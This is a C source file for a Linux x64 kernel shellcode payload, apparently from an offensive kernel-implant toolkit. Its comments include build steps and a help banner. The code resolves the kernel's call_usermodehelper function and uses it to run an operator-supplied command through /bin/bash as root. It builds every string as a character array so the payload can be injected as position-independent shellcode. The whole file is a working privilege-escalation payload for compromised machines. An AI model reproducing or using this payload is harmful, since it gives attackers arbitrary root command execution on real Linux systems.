// lx64_exec_root.c : execute user-mode command from kernel
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_exec_root.c
// ml64 lx64_common_a.asm /Felx64_exec_root.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_exec_root.obj lx64_common.obj
// shellcode64.exe -o lx64_exec_root.exe "EXECUTE A COMMAND AS ROOT                                      \nLINUX X64 EDITION                                              \n===============================================================\nExecute a program as root.                                     \nREQUIRED OPTIONS:                                              \n  -s : command to execute including parameters                 \n         Example: '-s touch /tmp/testfile.txt'                 \n  -1   : run flag - set to non zero to execute command.        \n===== EXECUTION ATTEMPT DETAILED RESULT INFORMATION ===========\nEXECUTE AS ROOT RESULT: %s\nRESULT CODE   : 0x%08X\n==============================================================="
//

#include "lx64_common.h"

typedef struct tdFN2 {
    QWORD call_usermodehelper;
} FN2, *PFN2;


BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
    QWORD NAMES[1];
    CHAR str_call_usermodehelper[] = { 'c', 'a', 'l', 'l', '_', 'u', 's', 'e', 'r', 'm', 'o', 'd', 'e', 'h', 'e', 'l', 'p', 'e', 'r', 0 };
    NAMES[0] = (QWORD)str_call_usermodehelper;
    return LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)NAMES, (QWORD)pfn2, sizeof(NAMES) / sizeof(QWORD));
}

VOID c_EntryPoint(PKMDDATA pk)
{
    FN2 fn2;
    CHAR str_cmd[] = { '/', 'b', 'i', 'n', '/', 'b', 'a', 's', 'h', 0 };
    CHAR str_arg1[] = { '-', 'c', 0 };
    char* argv[4] = { str_cmd, str_arg1, pk->dataInStr, NULL };

    CHAR e0[] = { 'H', 'O', 'M', 'E', '=', '/', 0 };
    CHAR e1[] = { 'T', 'E', 'R', 'M', '=', 'l', 'i', 'n', 'u', 'x', 0 };
    CHAR e2[] = { 'P', 'A', 'T', 'H', '=', '/', 'b', 'i', 'n', ':', '/', 's', 'b', 'i', 'n', ':', '/', 'u', 's', 'r', '/', 'b', 'i', 'n', ':', '/', 'u', 's', 'r', '/', 's', 'b', 'i', 'n', 0 };
    char* envp[4] = { e0, e1, e2, NULL };

	if(!pk->dataIn[1]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}

    if (!LookupFunctions2(pk, &fn2)) {
        pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
        return;
    }

    pk->dataOut[0] = SysVCall(fn2.call_usermodehelper, argv[0], argv, envp, 2);
}